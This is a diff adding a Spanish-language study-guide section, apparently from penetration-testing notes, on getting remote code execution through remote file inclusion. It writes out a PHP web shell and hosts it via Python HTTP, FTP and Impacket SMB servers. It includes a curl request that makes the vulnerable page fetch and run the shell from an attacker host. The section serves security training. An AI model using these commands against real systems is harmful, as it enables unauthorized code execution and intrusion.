@@ -345,6 +345,51 @@ Si vemos dicha página nos da por hecho que es vulnerable, esta ppagina es vulne
 
 ### REMOTE CODE EXECUTION CON RFI
 
+El primerp aso para ganar un codigo remoto de ejecución es crear el scrip malicioso en la aplicacion web. Haremos una web shell y usaremos aun revershe sell
+
+```
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+Ahora nosotros necesitamos incluirlo en la vulnerabilidad RFI. Es bueno estar escuchanndo los puertos para ver como el 80 o 443 
+
+## HTTP
+
+Vamos a empezar un servidor basico de python
+```
+sudo python3 -m http.server
+```
+Ahora incluiremos los archivos locales ousando la ip y el puerto
+
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/9ef723f3-623d-41ba-8334-bca2f6aa9c6b)
+
+una vez veremos como se ha descargado
+
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/017b2d17-0fa1-411b-8898-e5dd9c75dd51)
+
+## FTP
+
+El protocolo ftp también lo podemos abrir con python
+```
+sudo python -m pyftpdlib -p 21
+```
+
+Noralmente esto es bloqueado por el firewall.
+
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/78e10903-5087-46d1-98c3-9e7c690091f2)
+
+```
+curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
+```
+
+## SMB
+
+Una aplicacion web vulnerable en Windows necesitara SMB noramlmente utiliza, abrimos un servidor SMB usando "Impacket's smbserver.py" y a sí se autentifica
+
+```
+impacket-smbserver -smb2support share $(pwd)
+```
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/944831aa-be32-4670-bd48-e9bdfed92638)
 
 
 
